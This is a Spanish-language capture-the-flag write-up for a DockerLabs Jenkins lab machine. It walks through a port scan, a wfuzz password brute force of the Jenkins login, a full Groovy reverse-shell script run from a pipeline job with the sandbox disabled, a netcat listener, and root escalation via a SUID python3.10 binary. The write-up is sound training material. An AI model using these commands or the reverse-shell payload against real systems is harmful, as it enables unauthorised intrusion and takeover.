Máquina: [StrongJenkins](https://dockerlabs.es/#/#StrongJenkins), from DockerLabs

## 1) Como siempre iniciamos con un escaneo de puertos contra la IP destino
```
nmap -p- --open -sS -vvv --min-rate 3000 -n 172.17.0.2
```
Encontramos el puerto `8080` abierto y al acceder al mismo vemos un panel de login en Jenkins.

Antes de intentar acceder hacemos un poco de fuzzing para encontar más endpoints. Sin embargo no obtenemos nada útil aquí.


## 2) Toca hacer fuerza bruta al login de Jenkins
Usando Burpsuite o las herramientas de desarrollador de la web vemos que el payload enviado al momento de logearse está compuesto de la siguiente manera

```yml
j_username=<UERNAME>
j_password=<PASSWORD>
```
Si contamos con licencia de Burpsuite podemos interceptar la request y enviarla al repetidor. Una vez allí marcamos como campo a fuzzear el de la contraseña (`j_password`) y en para el usuario probamos con el clásico admin. Luego es cuestión de elegir la lista de contraseñas a probar y esperar. En el caso de no tener licencia la velocidad del intruder es limitada, por tal motivo yo prefiero utilizar `wfuzz` pues es completamente open source y podremos utilizar todos los recursos de nuestra computadora al máximo.

El comando utilizado es el siguiente
```bash
wfuzz -c -z file,/usr/share/wordlists/rockyou.txt -d "j_username=admin&j_password=FUZZ" --field "r.headers.response.location" --field "r.params.raw_post" http://172.17.0.2:8080/j_spring_security_check | grep -v loginError
```
`-c: output with colors`\
`-z <type,parameters>: specify a PAYLOAD for each FUZZ keyword with the format <type>,<parameters>`\
`-d <payload>: payload`\
`--field <object>: output the selected field`\
En este caso nosotros queremos observar el payload enviado, para observar la contraseña en cuestión, y el campo `Location` que pertenece al header de la response. Este último será crucial pues luego de probar un par de combinaciones manualmente se observa que cuando la contraseña el inválida se appendea la string `loginError` a la URL que se ve en campo previamente mencionado.
Justamente por este motivo también concatenamos el comando `grep` con el parámetro `-v` para excluir justamente aquellos casos donde aparezca `loginError` y quedarnos únicamente con la contraseña válida.

Luego de un rato encontramos la contraseña válida: _rockyou_.
Accedemos en el navegador y vemos el panel de control de Jenkins

## 3) Vulnerar la máquina desde Jenkins
Como el usuario Jenkins es administrador, podemos crear un nuevo job que ejecute un script custom. Para ello simplemente hacemos click en "New Item" elegimos un nombre, seleccionamos "pipeline" de todas las opciones que aparecen y luego le damos a "ok".
Resta la siguiente etapa que es la configuración del job, allí vemos que en la sección 'Pipeline' podemos agregar un script, en lenguaje [Groovy](https://www.jenkins.io/doc/pipeline/steps/groovy/).

Usando [esta](https://www.revshells.com/) página podemos crear una revershell en diferentes lenguajes. En este caso seleccionamos 'Groovy' y configuramos nuestra IP y puerto destino.
El script en cuestión:
```bash
String host="192.168.145.133";int port=443;String cmd="bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

Es muy importante que hagamos click en 'Approve script' cuando lo modificamos para darle permisos de ejecución y destildemos la casilla 'Use Groovy Sandbox' así lo ejecutamos en un entorno "libre".

Ya una vez configurado el job volvemos al host y nos ponemos en escucha con netcat
```bash
nc -n -lvp 443
```
Acto seguido ejecutamos el job desde el navegador y observamos que recibimos una conexión en el host.

## 4) Previo a la escalada de privilegios
Antes de buscar escalar privilegios vamos a ajustar la terminal para que sea más cómodo su uso
```
script /dev/null -c bash
# Ctrl + z
```
```
# Dentro del host
stty raw -echo;fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 51 columns 181
```

## 5) Escalamos privilegios
Ahora toca escalar privilegios y para ello siempre lo buscamos qué podemos ejecutar como sudo. Lo principal a verificar será ejecutar `sudo -l` y ver que devuelve. En este caso nos dice que no existe el comando `sudo` con lo cual recurrimos al segundo método para encontrar aquellos programas que tienen el flag SUID:
```
find / -perm -4000 2>/dev/null
```

Encontramos el binario `/usr/bin/python3.10`. Acá ya está sentenciada la máquina. Simplemente ejecutamos
```bash
# Ejecutamos python3.10 de modo interactivo
/usr/bin/python3.10 -i
```
una vez dentro de python buscamos ejecutar `/bin/bash` con el parámetro `-p` así utilizamos los permisos del owner, que es _root_.
```python
import os
os.execl("/bin/bash", "bash", "-p")
# Notamos que cambió el prompt a 'bash-5.1#'
# eso indica que ya tenemos una instancia de bash interactiva modo root
$ whoami
root
```

**NOTA**: Es necesario utilizar [os.execl()](https://docs.python.org/3/library/os.html#os.execl) en vez de [os.system()](https://docs.python.org/3/library/os.html#os.system) pues el segundo crea un SUBPROCESO mientras que el primero reemplaza el proceso actual por el nuevo. Al hacer eso el binario python3.10, que tiene permisos de root estará ejecutando `/bin/bash -p` por nosotros y no habrá conflicto de permisos.

## Resumen del ataque

Este método funcionó por lo siguiente:
* Tanto el usuario como la contraseña del administrador de Jenkins son débiles
* Jenkins permite ejecutar comandos fuera de la sandbox de Groovy, logrando así un RCE
* La máquina está configurada de tal manera que no le prohibe entablar una reverse shell
* el usuario _Jenkins_ tiene permiso a ejecutar python3.10 como root
